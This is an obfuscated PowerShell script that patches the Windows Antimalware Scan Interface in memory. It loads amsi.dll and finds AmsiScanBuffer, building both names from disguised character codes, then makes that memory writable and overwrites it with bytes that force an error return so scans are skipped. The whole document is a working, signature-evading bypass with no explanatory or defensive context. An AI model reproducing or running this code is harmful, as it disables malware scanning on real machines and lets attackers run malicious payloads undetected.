$pN96oQwvVIdvkRuSMrC = @"
using System;
using System.Runtime.InteropServices;
public class pN96oQwvVIdvkRuSMrC {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr yw161HjXefjbA5nYx, string D65z1e0);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr HCQuMxFrsGUe_4D, UIntPtr KUQF5BRcldpO8f0b, uint ti1Hh, out uint jf2dJdXI);
}
"@

Add-Type $pN96oQwvVIdvkRuSMrC

$G8k = [pN96oQwvVIdvkRuSMrC]::LoadLibrary("$(('àmsì.d'+'ll').NormALiZE([cHar](39+31)+[cHar](111*82/82)+[CHAr]([byTE]0x72)+[CHAR](64+45)+[ChAr](33+35)) -replace [CHAr]([byte]0x5c)+[cHaR](112*14/14)+[CHAR]([BYte]0x7b)+[CHAR](1+76)+[cHaR]([BYTe]0x6e)+[ChAr](125*92/92))")
$Wg4p1hRB = [pN96oQwvVIdvkRuSMrC]::GetProcAddress($G8k, "$([chAr](65*42/42)+[cHar](32+77)+[cHar]([bYtE]0x73)+[ChAr]([byTE]0x69)+[chAR](83)+[chaR](99+78-78)+[ChAr](97)+[ChAR](110*28/28)+[CHar]([bYTe]0x42)+[CHAR](48+69)+[CHar]([Byte]0x66)+[char](102)+[char](101)+[chaR]([BytE]0x72))")
$p = 0
[pN96oQwvVIdvkRuSMrC]::VirtualProtect($Wg4p1hRB, [uint32]5, 0x40, [ref]$p)
$bNshXmldIe = "0xB8"
$nv7_se9D2d78L3q44EkG = "0x57"
$UZR2Aj = "0x00"
$EwZTHdzSH_YQHS76iQ = "0x07"
$LoRNsMp38jGPZb = "0x80"
$rLJUrRE7 = "0xC3"
$hKrcY6oZoiItFLbrNh = [Byte[]] ($bNshXmldIe,$nv7_se9D2d78L3q44EkG,$UZR2Aj,$EwZTHdzSH_YQHS76iQ,+$LoRNsMp38jGPZb,+$rLJUrRE7)
[System.Runtime.InteropServices.Marshal]::Copy($hKrcY6oZoiItFLbrNh, 0, $Wg4p1hRB, 6)